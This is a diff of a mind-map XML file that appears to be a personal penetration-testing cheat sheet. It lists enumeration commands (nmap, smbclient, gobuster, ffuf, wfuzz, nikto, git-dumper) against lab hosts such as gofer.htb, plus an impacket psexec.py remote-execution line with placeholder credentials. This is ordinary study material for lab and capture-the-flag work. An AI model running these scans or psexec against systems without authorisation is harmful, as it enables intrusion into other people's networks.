               <nodename>service Enumeration</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="87" posx="1718.3444824218757" posy="213.28626833679743" maxwidth="200" width="98" height="46" side="left" fold="false" treesize="464.64919026692712" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="87" posx="-203.17240265877945" posy="-307.31634193338397" maxwidth="200" width="98" height="46" side="left" fold="false" treesize="464.64919026692712" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>smb(445)</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="89" posx="1318.3658854166674" posy="-205.36292193012969" maxwidth="200" width="200" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="89" posx="-603.15099966398691" posy="-725.96553220031069" maxwidth="200" width="200" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>smbclient //IP/subfolder</nodename>
                       <nodenote></nodenote>
                     </node>
-                    <node id="93" posx="1644.3036295572924" posy="-39.377041396275601" maxwidth="579.62937418619799" width="602" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="91" posx="-277.21325552336248" posy="-559.9796516664569" maxwidth="579.62937418619799" width="602" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>python3 /usr/share/doc/python3-impacket/examples/psexec.py 'user:pass@IP'</nodename>
                       <nodenote></nodenote>
                     </node>
-                    <node id="91" posx="1483.3444824218761" posy="167.28626833679789" maxwidth="200" width="135" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="93" posx="-438.17240265877854" posy="-353.31634193338351" maxwidth="200" width="135" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>smbclient -L IP</nodename>
@@ -347,19 +347,19 @@
                     </node>
                   </nodes>
                 </node>
-                <node id="95" posx="1943.3119303385422" posy="248.62096478862054" maxwidth="200" width="69" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="95" posx="21.795045257887523" posy="-271.98164548156075" maxwidth="200" width="69" height="46" side="left" fold="false" treesize="245.47908528645826" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>nmap</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="97" posx="1232.6645507812507" posy="141.14187950216228" maxwidth="561.3616943359375" width="543" height="46" side="left" fold="true" treesize="51.819580078124886" color="#dc322f" colorroot="true" layout="Manual">
+                    <node id="97" posx="-688.85233429940388" posy="-379.46073076801923" maxwidth="561.3616943359375" width="543" height="46" side="left" fold="false" treesize="51.819580078124886" color="#dc322f" colorroot="true" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>nmap -sS -Pn -d -p- --open --min-rate=5000 10.129.15.160 -oG allPorts</nodename>
                       <nodenote></nodenote>
                       <nodes>
-                        <node id="99" posx="929.32045491536519" posy="135.32229942403751" maxwidth="200" width="226" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                        <node id="99" posx="-992.19643016528994" posy="-385.28031084614383" maxwidth="200" width="226" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                           <formatting/>
                           <nodename>nmap -sCV $IP -oA tarjeted</nodename>
@@ -367,19 +367,19 @@
                         </node>
                       </nodes>
                     </node>
-                    <node id="101" posx="1664.3119303385429" posy="248.62096478862054" maxwidth="200" width="179" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="101" posx="-257.20495474211157" posy="-271.98164548156075" maxwidth="200" width="179" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>nmap -sVC ip.ip.ip.ip</nodename>
                       <nodenote></nodenote>
                     </node>
-                    <node id="103" posx="1622.3119303385429" posy="294.62096478862054" maxwidth="200" width="221" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="103" posx="-213.89375682544551" posy="-217.98376136697749" maxwidth="200" width="221" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>nmap 1.1.1.1.1 -oA output</nodename>
                       <nodenote></nodenote>
                     </node>
-                    <node id="105" posx="1628.3119303385429" posy="340.62096478862054" maxwidth="200" width="215" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="105" posx="-293.20495474211157" posy="-179.98164548156075" maxwidth="200" width="215" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>nmap -p -v -oA fullportlist</nodename>
@@ -387,31 +387,31 @@
                     </node>
                   </nodes>
                 </node>
-                <node id="107" posx="1903.9948730468757" posy="386.62096478862054" maxwidth="200" width="107" height="46" side="left" fold="false" treesize="45.999999999999943" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="107" posx="-17.522012033779447" posy="-133.98164548156075" maxwidth="200" width="107" height="46" side="left" fold="false" treesize="45.999999999999943" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>nc $ip port</nodename>
                   <nodenote></nodenote>
                 </node>
-                <node id="109" posx="1922.3119303385422" posy="570.62096478861986" maxwidth="200" width="90" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="109" posx="0.79504525788752289" posy="50.018354518438343" maxwidth="200" width="90" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>rpc(135)</nodename>
                   <nodenote></nodenote>
                 </node>
-                <node id="111" posx="1884.3119303385422" posy="616.62096478861986" maxwidth="200" width="128" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="111" posx="-37.204954742112477" posy="96.018354518438343" maxwidth="200" width="128" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>gRPC (50051)</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="113" posx="1559.3119303385424" posy="616.62096478861986" maxwidth="200" width="225" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="113" posx="-362.20495474211248" posy="96.018354518438343" maxwidth="200" width="225" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>grpcui --plaintext host:port</nodename>
                       <nodenote></nodenote>
                       <nodes>
-                        <node id="115" posx="1347.3119303385424" posy="616.62096478861986" maxwidth="200" width="112" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                        <node id="115" posx="-574.20495474211202" posy="96.018354518438343" maxwidth="200" width="112" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                           <formatting/>
                           <nodename>visit websit</nodename>
@@ -423,73 +423,26 @@
                 </node>
               </nodes>
             </node>
-            <node id="117" posx="1785.000732421877" posy="484.04126075006161" maxwidth="200" width="60" height="46" side="left" fold="false" treesize="716.33166503906307" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="117" posx="-136.51615265877763" posy="165.27593075331805" maxwidth="200" width="60" height="46" side="left" fold="false" treesize="1073.3241373697924" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>Web</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="119" posx="1815.631103515627" posy="212.73112077610426" maxwidth="200" width="54" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
-                  <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
-                  <formatting/>
-                  <nodename>F12</nodename>
-                  <nodenote></nodenote>
-                  <nodes>
-                    <node id="121" posx="1687.631103515627" posy="190.73112077610426" maxwidth="200" width="120" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
-                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
-                      <formatting/>
-                      <nodename>debbuging</nodename>
-                      <nodenote>console.log("test")
-</nodenote>
-                    </node>
-                    <node id="123" posx="1687.631103515627" posy="236.73112077610426" maxwidth="200" width="89" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
-                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
-                      <formatting/>
-                      <nodename>AJAX/api</nodename>
-                      <nodenote></nodenote>
-                    </node>
-                  </nodes>
-                </node>
-                <node id="125" posx="1039.0153808593755" posy="239.79170834120771" maxwidth="200" width="194" height="46" side="left" fold="false" treesize="252.67875162760402" color="#dc322f" colorroot="true" layout="Manual">
+                <node id="119" posx="-966.52363963794619" posy="-234.12881371282793" maxwidth="200" width="194" height="46" side="left" fold="false" treesize="218.02071126302076" color="#dc322f" colorroot="true" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>Directory Enumeration</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="127" posx="480.01538085937477" posy="148.79170834120771" maxwidth="431.0316162109375" width="475" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="121" posx="-1525.523639637948" posy="-325.12881371282793" maxwidth="431.0316162109375" width="475" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>gobuster dir -w dirmedium2.3 -u http://IP -x php,txt,html,js</nodename>
                       <nodenote>flag -k para evitar checks de certificados
 </nodenote>
-                    </node>
-                    <node id="129" posx="840.01538085937545" posy="194.79170834120771" maxwidth="200" width="99" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
-                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
-                      <formatting/>
-                      <nodename>dirb $URL</nodename>
-                      <nodenote></nodenote>
-                    </node>
-                    <node id="131" posx="116.015380859375" posy="240.79170834120771" maxwidth="795.96750895182197" width="823" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
-                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
-                      <formatting>
-                        <urllink url="http://192.168.1." spos="87" epos="104" embedded="true" ignore="false"/>
-                      </formatting>
-                      <nodename>wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.1.X/FUZZ</nodename>
-                      <nodenote></nodenote>
-                    </node>
-                    <node id="133" posx="184.38582356770803" posy="309.47045996881127" maxwidth="868.68499755859352" width="435" height="46" side="left" fold="true" treesize="45.999999999999943" color="#dc322f" colorroot="false" layout="Manual">
-                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
-                      <formatting/>
-                      <nodename>ffuf -w $list -u $URL/FUZZ -mc all -fc 404,403 -recursion</nodename>
-                      <nodenote></nodenote>
-                    </node>
-                    <node id="135" posx="911.01538085937545" posy="355.47045996881172" maxwidth="200" width="57" height="46" side="left" fold="true" treesize="53.49951171875" color="#dc322f" colorroot="false" layout="Manual">
-                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
-                      <formatting/>
-                      <nodename>/.git</nodename>
-                      <nodenote></nodenote>
                       <nodes>
-                        <node id="137" posx="687.04028320312545" posy="347.97094825006172" maxwidth="197.30476888020826" width="184" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                        <node id="123" posx="-1809.5236396379476" posy="-325.12881371282793" maxwidth="197.30476888020826" width="184" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                           <formatting/>
                           <nodename>git-dumper $URL $dir</nodename>
@@ -497,15 +450,92 @@
                         </node>
                       </nodes>
                     </node>
+                    <node id="125" posx="-1165.5236396379466" posy="-279.12881371282793" maxwidth="200" width="99" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                      <formatting/>
+                      <nodename>dirb $URL</nodename>
+                      <nodenote></nodenote>
+                    </node>
+                    <node id="127" posx="-1889.5236396379485" posy="-233.12881371282793" maxwidth="795.96750895182197" width="823" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                      <formatting>
+                        <urllink url="http://192.168.1." spos="87" epos="104" embedded="true" ignore="false"/>
+                      </formatting>
+                      <nodename>wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.1.X/FUZZ</nodename>
+                      <nodenote></nodenote>
+                    </node>
+                    <node id="129" posx="-1821.1531969296154" posy="-164.45006208522437" maxwidth="868.68499755859352" width="435" height="46" side="left" fold="false" treesize="45.999999999999943" color="#dc322f" colorroot="false" layout="Manual">
+                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                      <formatting/>
+                      <nodename>ffuf -w $list -u $URL/FUZZ -mc all -fc 404,403 -recursion</nodename>
+                      <nodenote></nodenote>
+                    </node>
+                    <node id="131" posx="-1109.1718329973212" posy="-153.10810244980695" maxwidth="200" width="57" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                      <formatting/>
+                      <nodename>/.git</nodename>
+                      <nodenote></nodenote>
+                    </node>
                   </nodes>
                 </node>
-                <node id="139" posx="1581.000732421875" posy="384.79126075006161" maxwidth="200" width="104" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="133" posx="-493.16931021086066" posy="-145.81985375189043" maxwidth="200" width="54" height="46" side="left" fold="false" treesize="212.01285807291663" color="#dc322f" colorroot="false" layout="Manual">
+                  <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                  <formatting/>
+                  <nodename>F12</nodename>
+                  <nodenote></nodenote>
+                  <nodes>
+                    <node id="135" posx="-630.50516633065251" posy="-287.83271182480695" maxwidth="200" width="120" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                      <formatting/>
+                      <nodename>debbuging</nodename>
+                      <nodenote>console.log("test")
+</nodenote>
+                    </node>
+                    <node id="137" posx="-621.16931021086054" posy="-121.81985375189043" maxwidth="200" width="89" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                      <formatting/>
+                      <nodename>AJAX/api</nodename>
+                      <nodenote></nodenote>
+                    </node>
+                  </nodes>
+                </node>
+                <node id="139" posx="-1088.4879137264868" posy="118.87407528456782" maxwidth="200" width="170" height="46" side="left" fold="false" treesize="228.67683919270826" color="#dc322f" colorroot="false" layout="Manual">
+                  <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                  <formatting/>
+                  <nodename>subdomain Enum</nodename>
+                  <nodenote>hay que a&#xF1;adirlo a /etc/hosts</nodenote>
+                  <nodes>
+                    <node id="141" posx="-1787.1432685441948" posy="0.035777758525625813" maxwidth="629.32938639322947" width="576" height="64" side="left" fold="false" treesize="64" color="#dc322f" colorroot="false" layout="Manual">
+                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                      <formatting>
+                        <urllink url="http://gofer.htb" spos="89" epos="105" embedded="true" ignore="false"/>
+                      </formatting>
+                      <nodename>ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://gofer.htb" -H "Host: FUZZ.gofer.htb" -fw 20</nodename>
+                      <nodenote></nodenote>
+                    </node>
+                    <node id="143" posx="-2011.1632880754457" posy="92.034150154359111" maxwidth="778.66300455729186" width="758" height="64" side="left" fold="false" treesize="64" color="#dc322f" colorroot="false" layout="Manual">
+                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                      <formatting>
+                        <urllink url="http://gofer.htb" spos="92" epos="108" embedded="true" ignore="false"/>
+                      </formatting>
+                      <nodename>wfuzz -c -f sub-fighter -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u "http://gofer.htb" -H "Host: FUZZ.gofer.htb" --hc 301</nodename>
+                      <nodenote></nodenote>
+                    </node>
+                    <node id="145" posx="-1912.4147529191957" posy="182.71261695123457" maxwidth="711.98435465494788" width="708" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                      <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
+                      <formatting/>
+                      <nodename>gobuster dns -d gofer.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt </nodename>
+                      <nodenote></nodenote>
+                    </node>
+                  </nodes>
+                </node>
+                <node id="147" posx="-340.51615265877945" posy="267.86321102675521" maxwidth="200" width="104" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>fingerprint</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="141" posx="1360.0007324218757" posy="384.79126075006161" maxwidth="200" width="121" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="149" posx="-561.51615265877899" posy="267.86321102675521" maxwidth="200" width="121" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>whatweb $IP</nodename>
@@ -513,19 +543,19 @@
                     </node>
                   </nodes>
                 </node>
-                <node id="143" posx="1603.0007324218759" posy="485.29126075006161" maxwidth="200" width="82" height="46" side="left" fold="true" treesize="155" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="151" posx="-318.51615265877854" posy="368.3632110267551" maxwidth="200" width="82" height="46" side="left" fold="false" treesize="155" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>generic</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="145" posx="1438.0007324218752" posy="430.79126075006161" maxwidth="200" width="65" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="153" posx="-483.51615265877945" posy="313.8632110267551" maxwidth="200" width="65" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>nikto</nodename>
                       <nodenote></nodenote>
                       <nodes>
-                        <node id="147" posx="1106.0007324218757" posy="430.79126075006161" maxwidth="205.31241861979166" width="232" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                        <node id="155" posx="-815.51615265877888" posy="313.8632110267551" maxwidth="205.31241861979166" width="232" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                           <formatting/>
                           <nodename>nikto -host $IP | tee archivo</nodename>
@@ -533,13 +563,13 @@
                         </node>
                       </nodes>
                     </node>
-                    <node id="149" posx="1352.0007324218757" posy="485.29126075006161" maxwidth="200" width="151" height="46" side="left" fold="true" treesize="54.5" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="157" posx="-569.51615265877899" posy="368.3632110267551" maxwidth="200" width="151" height="46" side="left" fold="false" treesize="54.5" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>wordlist creation</nodename>
                       <nodenote></nodenote>
                       <nodes>
-                        <node id="151" posx="908.00073242187614" posy="476.79126075006161" maxwidth="334.64640299479169" width="344" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                        <node id="159" posx="-1013.5161526587788" posy="359.8632110267551" maxwidth="334.64640299479169" width="344" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                           <formatting/>
                           <nodename>cewl url -d4 --with-numbers &gt; lista_cewl.lst</nodename>
@@ -547,13 +577,13 @@
                         </node>
                       </nodes>
                     </node>
-                    <node id="153" posx="1448.0007324218752" posy="539.79126075006161" maxwidth="200" width="55" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="161" posx="-473.51615265877945" posy="422.8632110267551" maxwidth="200" width="55" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>curl</nodename>
                       <nodenote></nodenote>
                       <nodes>
-                        <node id="155" posx="1114.0007324218757" posy="539.79126075006161" maxwidth="207.00186157226562" width="234" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                        <node id="163" posx="-807.51615265877888" posy="422.8632110267551" maxwidth="207.00186157226562" width="234" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                           <formatting/>
                           <nodename>curl -u USER:PASS -s "$URL"</nodename>
@@ -563,43 +593,43 @@
                     </node>
                   </nodes>
